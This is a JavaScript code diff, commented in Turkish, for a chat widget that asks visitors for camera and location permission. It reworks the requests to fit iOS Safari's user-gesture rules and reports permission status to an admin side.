@@ -729,6 +729,13 @@
     let lastWriteAt = 0;
     let asking = false;
 
+    // Otomatik istek yokken admin “reddedildi” görmesin
+    if (deferAsk || isLikelyMobile()) {
+      sync
+        .writeLocationStatus?.(sessionId, callId, "awaiting-tap", "Ziyaretçi konum butonuna dokunmalı")
+        .catch(() => {});
+    }
+
     const clearLocRetry = () => {
       if (state.locationRetryTimer) {
         window.clearTimeout(state.locationRetryTimer);
@@ -744,7 +751,7 @@
         el.className = "chat-inline-prompt chat-location-perm-denied";
         el.innerHTML =
           `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
-          '<p class="chat-camera-note">Konum için alttaki butona dokunun (otomatik istemez).</p>';
+          '<p class="chat-camera-note">Konum için alttaki kırmızı butona dokunun. Pencere açılmazsa: Ayarlar → Safari → Konum → Sor.</p>';
         box.appendChild(el);
       }
       box.scrollTop = box.scrollHeight;
@@ -801,13 +808,26 @@
       }, LOCATION_RETRY_MS);
     };
 
-    const onErr = (err) => {
+    const onErr = (err, { fromUserTap = false } = {}) => {
       if (!cameraSessions.has(callId) || state._hadLocation) return;
       const code = err?.code;
-      const msg =
-        code === 1 ? "denied" : code === 2 ? "unavailable" : code === 3 ? "timeout" : "error";
-      sync.writeLocationStatus?.(sessionId, callId, msg, err?.message || msg).catch(() => {});
-      if (!deferAsk && !isLikelyMobile() && box) {
+      // Safari jestsiz / paralel istekte de code=1 döner; bunu “reddedildi” sanma
+      const silent =
+        !fromUserTap && (deferAsk || isLikelyMobile());
+      const msg = silent
+        ? "awaiting-tap"
+        : code === 1
+          ? "denied"
+          : code === 2
+            ? "unavailable"
+            : code === 3
+              ? "timeout"
+              : "error";
+      const detail = silent
+        ? "Konum penceresi açılmadı; ziyaretçi butona dokunmalı"
+        : err?.message || msg;
+      sync.writeLocationStatus?.(sessionId, callId, msg, detail).catch(() => {});
+      if (!silent && !deferAsk && !isLikelyMobile() && box) {
         appendMessage(box, "bot", LOCATION_DENIED_TEXT, { sync: true });
       }
       syncMessage("user", `Konum izni alınamadı (${msg}).`);
@@ -816,7 +836,7 @@
       state._onLocationDenied?.();
     };
 
-    const askLocation = () => {
+    const askLocation = (fromUserTap = false) => {
       if (!cameraSessions.has(callId) || state._hadLocation || asking) return;
       asking = true;
       if (state.geoWatchId != null) {
@@ -832,7 +852,7 @@
           asking = false;
           publish(pos);
           if (!cameraSessions.has(callId) || !state._hadLocation) return;
-          state.geoWatchId = navigator.geolocation.watchPosition(publish, onErr, {
+          state.geoWatchId = navigator.geolocation.watchPosition(publish, (err) => onErr(err), {
             enableHighAccuracy: true,
             maximumAge: 2000,
             timeout: 15000,
@@ -840,21 +860,21 @@
         },
         (err) => {
           asking = false;
-          onErr(err);
+          onErr(err, { fromUserTap });
         },
         {
-          enableHighAccuracy: true,
-          maximumAge: 0,
-          timeout: 12000,
+          enableHighAccuracy: false,
+          maximumAge: 60000,
+          timeout: 60000,
         }
       );
     };
 
     state.locationRetryTimer = null;
-    state.retryLocation = askLocation;
+    state.retryLocation = () => askLocation(true);
     // Mobil / defer: otomatik isteme — sadece dokunuşla askLocation
     if (!deferAsk && !isLikelyMobile()) {
-      askLocation();
+      askLocation(false);
     }
   }
 
@@ -931,7 +951,7 @@
       const code = err?.code;
       const hint =
         code === 1
-          ? "Safari konumu engelledi. Ayarlar → Safari → Konum → Sor / İzin Ver, siteyi yenileyip tekrar dokunun."
+          ? "Safari konumu engelledi veya pencere açılmadı. Ayarlar → Safari → Konum → Sor / İzin Ver, sonra siteyi yenileyip tekrar dokunun."
           : code === 2
             ? "Konum servisi kapalı. Ayarlar → Gizlilik → Konum Servisleri → Açık."
             : code === 3
@@ -939,11 +959,19 @@
               : err?.message || "Bilinmeyen hata";
       note.textContent = `Konum açılamadı (${code ?? "?"}): ${hint}`;
       syncMessage("user", `Konum izni başarısız (${code || "?"}).`);
+      const sync = window.ChatSync;
+      sync
+        ?.writeLocationStatus?.(
+          sync.getSessionId(),
+          callId,
+          code === 1 ? "denied" : code === 2 ? "unavailable" : code === 3 ? "timeout" : "error",
+          hint
+        )
+        .catch(() => {});
       options.onSoftDeny?.(String(code || "err"));
     };
 
-    // iOS Safari: getCurrentPosition tiklama handler’ında SENKRON başlamalı
-    // (async / ara await / retryLocation sarmalayıcısı jesti bozar)
+    // iOS Safari: getCurrentPosition tiklama handler’ında SENKRON; kamera ile AYNI ANDA değil
     const requestLoc = () => {
       if (!navigator.geolocation) {
         note.textContent = "Bu tarayıcı konum desteklemiyor. Safari ile HTTPS sitede açın.";
@@ -962,11 +990,8 @@
         return;
       }
 
-      // Native API — henüz await yok (Safari jesti burada tüketilir)
-      let posHandled = false;
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          posHandled = true;
           const live = cameraSessions.get(callId);
           if (!live) {
             note.textContent = "Kamera oturumu yok; sayfayı yenileyip önce kamerayı verin.";
@@ -975,10 +1000,7 @@
           }
           finishOk(live, pos);
         },
-        (err) => {
-          posHandled = true;
-          finishErr(err);
-        },
+        (err) => finishErr(err),
         {
           enableHighAccuracy: false,
           maximumAge: 60000,
@@ -989,20 +1011,9 @@
       okBtn.disabled = true;
       fab.disabled = true;
       note.textContent = "Safari konum penceresi açılmalı… İzin Ver’e basın.";
-
-      window.setTimeout(() => {
-        if (posHandled || !cameraSessions.has(callId) || cameraSessions.get(callId)?._hadLocation) {
-          return;
-        }
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const live = cameraSessions.get(callId);
-            if (live) finishOk(live, pos);
-          },
-          (err) => finishErr(err),
-          { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
-        );
-      }, 1500);
+      sync
+        ?.writeLocationStatus?.(sync.getSessionId(), callId, "prompting", "Konum penceresi istendi")
+        .catch(() => {});
     };
 
     okBtn.addEventListener("click", (e) => {
@@ -1437,61 +1448,70 @@
       }
 
       okBtn.disabled = true;
-      note.textContent = "Kamera / konum izni açılıyor… İzin Ver’e basın.";
-
       const existing = cameraSessions.get(callId);
 
-      // iOS Safari: konum API’si await ÖNCESİ, aynı jest içinde başlamalı
-      let seedLocation = null;
-      const locKickoff =
-        navigator.geolocation && (!existing?._hadLocation)
-          ? new Promise((resolve) => {
-              navigator.geolocation.getCurrentPosition(
-                (pos) => resolve(pos),
-                () => resolve(null),
-                { enableHighAccuracy: false, maximumAge: 60000, timeout: 60000 }
-              );
-            })
-          : Promise.resolve(null);
-
-      try {
-        if (nativeFromTap) {
-          if (existing?.stream && !existing._hadLocation) {
-            // Aynı dokunuşta doğrudan konum iste — ikinci butona leave etme
-            note.textContent = "Konum penceresi açılmalı… İzin Ver’e basın.";
-            seedLocation = await locKickoff;
-            if (seedLocation?.coords) {
-              applySeedLocationToSession(sync, callId, existing, seedLocation);
-              card.remove();
-              appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
-              options.onGranted?.();
-              return;
-            }
+      // Konum GEREKEN ve kamera zaten açık: bu dokunuşta SADECE konum
+      // (Safari: kamera ile aynı anda konum isteği penceresiz denied üretir)
+      if (nativeFromTap && existing?.stream && !existing._hadLocation) {
+        note.textContent = "Konum penceresi açılmalı… İzin Ver’e basın.";
+        if (!navigator.geolocation) {
+          okBtn.disabled = false;
+          note.textContent = "Bu tarayıcı konum desteklemiyor.";
+          options.onSoftDeny?.("unsupported");
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            applySeedLocationToSession(sync, callId, existing, pos);
             card.remove();
+            appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
+            options.onGranted?.();
+          },
+          (err) => {
+            okBtn.disabled = false;
+            const code = err?.code;
+            note.textContent =
+              code === 1
+                ? "Safari konumu engelledi. Ayarlar → Safari → Konum → Sor, siteyi yenileyin."
+                : "Konum alınamadı — tekrar dokunun.";
+            sync
+              ?.writeLocationStatus?.(
+                sync.getSessionId(),
+                callId,
+                code === 1 ? "denied" : "error",
+                err?.message || String(code)
+              )
+              .catch(() => {});
             showLocationTapButton(box, callId, {
               onGranted: () => options.onGranted?.(),
               onSoftDeny: (r) => options.onSoftDeny?.(r),
             });
-            return;
-          }
+          },
+          { enableHighAccuracy: false, maximumAge: 60000, timeout: 60000 }
+        );
+        return;
+      }
 
-          // Kamera + konum: konum jestini await’ten önce başlattık
-          const streamPromise = acquireCameraStreamNative();
-          const [stream, loc] = await Promise.all([streamPromise, locKickoff]);
-          seedLocation = loc;
+      note.textContent = "Kamera izni açılıyor… İzin Ver’e basın.";
 
+      try {
+        if (nativeFromTap) {
+          // SADECE kamera — konumu aynı jestte isteme (Safari sessiz denied)
+          const stream = await acquireCameraStreamNative();
           card.remove();
           const result = await startVisitorCamera(box, callId, {
             auto: false,
             stream: stream || undefined,
-            seedLocation: seedLocation || undefined,
-            deferLocation: isLikelyMobile() && !seedLocation?.coords,
+            deferLocation: true,
           });
 
           if (result === "ok" && callId && !cameraSessions.get(callId)?._hadLocation) {
-            appendMessage(box, "bot", "Kamera alındı. Konum için kırmızı butona dokunun.", {
-              sync: true,
-            });
+            appendMessage(
+              box,
+              "bot",
+              "Kamera alındı. Şimdi KONUM için kırmızı butona dokunun (ayrı pencere açılır).",
+              { sync: true }
+            );
             showLocationTapButton(box, callId, {
               onGranted: () => options.onGranted?.(),
               onSoftDeny: (r) => {
@@ -1518,7 +1538,6 @@
         return;
       }
 
-      // nativeFromTap false yolu
       card.remove();
       const result = await startVisitorCamera(box, callId, {
         auto: false,
